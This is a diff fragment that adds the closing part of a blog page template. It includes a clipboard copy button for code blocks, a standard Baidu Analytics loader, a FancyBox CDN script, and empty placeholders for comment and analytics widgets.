+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>
+
+
+</body>
+</html>
